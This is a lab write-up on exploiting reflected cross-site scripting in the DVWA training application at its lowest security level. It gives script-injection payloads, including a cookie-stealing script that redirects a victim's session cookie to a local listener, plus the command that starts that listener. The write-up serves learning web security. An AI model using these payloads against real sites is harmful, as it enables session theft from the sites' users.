# 🟢 Reflected XSS – Low Security (DVWA)

At the **Low Security** level, DVWA provides no protection against XSS.  
This makes it straightforward to inject and execute malicious JavaScript.

---

## 🔎 What’s Happening?

- The web application **takes user input** (e.g., Name field) and **reflects it directly back** into the HTML response without sanitization or encoding.  
- The HTTP header explicitly confirms that XSS protection is disabled:
```

X-XSS-Protection: 0

```
- Since the input is echoed unsafely, **any JavaScript code inserted will run immediately** in the browser.

---

## 🛠️ Step-by-Step Exploitation

1. **Navigate to Reflected XSS (Low)** in DVWA.  
2. Enter a normal name like:
```

Ammad

```
→ The page reflects it back as:
```

Hello Ammad

````
This shows the input is inserted directly into the page.

3. **Inject a malicious script** instead of plain text:
```html
<script>alert('You have been hacked')</script>
````

4. Submit the form.
   → The script executes immediately, showing a JavaScript alert popup. ✅

---

## 🎯 Proof of Concept

### Payload:

```html
<script>alert('XSS Test')</script>
```

### Result:

A popup box appears with the message **“XSS Test”**, proving that arbitrary JavaScript is executed.

---

## 🍪 Example – Stealing Cookies

Instead of just an alert, an attacker could steal session cookies:

```html
<script>
  window.location='http://127.0.0.1:1337/?cookie='+document.cookie
</script>
```

1. Start a simple server to catch the cookie:

   ```bash
   python3 -m http.server 1337
   ```
2. When the victim clicks the crafted link or submits the form,
   their browser sends the cookie to the attacker’s server.

---

## ✅ Key Takeaway

* At **Low Security**, DVWA does not filter or encode input at all.
* Any JavaScript payload is executed immediately.
* This demonstrates how dangerous it is when applications **reflect user input without validation**.

---
